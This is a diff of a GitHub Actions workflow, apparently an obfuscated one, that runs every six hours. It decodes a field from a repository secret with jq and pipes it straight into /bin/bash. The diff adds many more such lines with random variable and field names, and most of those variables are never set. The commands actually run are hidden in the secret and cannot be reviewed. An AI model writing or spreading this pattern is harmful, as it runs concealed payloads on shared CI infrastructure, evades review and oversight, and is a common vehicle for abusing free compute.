@@ -1,24 +1,34 @@
 name: xiaodanai1762
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 5/6 * * *'
+    - cron: '18 0/6 * * *'
 
-jobs:  # 16277
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xiaodanai1762
         env:
-          d0259: ${{ secrets.d0259 }}
+          ouiw46: ${{ secrets.ouiw46 }}
         run: |
-          echo $d0259 | jq -r .zest4 | /bin/bash
-          echo $vtmb72 | jq -r .uzo7 | /bin/bash
-          echo $b93130 | jq -r .ep0024 | /bin/bash
-          echo $egye3 | jq -r .gcaw26 | /bin/bash
-          echo $nqga1969 | jq -r .vj5 | /bin/bash
-          echo $ty7 | jq -r .oy189 | /bin/bash
-          echo $qb210 | jq -r .ua6 | /bin/bash
+          echo $ouiw46 | jq -r .bjbih02 | /bin/bash
+          echo $lmbz28742 | jq -r .vqoa933 | /bin/bash
+          echo $knwzp1531 | jq -r .plc3 | /bin/bash
+          echo $sxbsp4066 | jq -r .pkpvh17101 | /bin/bash
+          echo $huuti97 | jq -r .ylgr778 | /bin/bash
+          echo $zdmfp69780 | jq -r .y9 | /bin/bash
+          echo $vj02577 | jq -r .jqzfp784 | /bin/bash
+          echo $jjp759 | jq -r .yvng58690 | /bin/bash
+          echo $etkjq74554 | jq -r .bklpz173 | /bin/bash
+          echo $tzkc1 | jq -r .fpmlz673 | /bin/bash
+          echo $hhdyg1 | jq -r .cbzej2498 | /bin/bash
+          echo $xiuu81644 | jq -r .g70116 | /bin/bash
+          echo $pgh3842 | jq -r .ect48 | /bin/bash
+          echo $x38488 | jq -r .j868 | /bin/bash
+          echo $bsxre0462 | jq -r .h2 | /bin/bash
+          echo $g19 | jq -r .xsgxr260 | /bin/bash
+          echo $ml26 | jq -r .tvxz0093 | /bin/bash
 
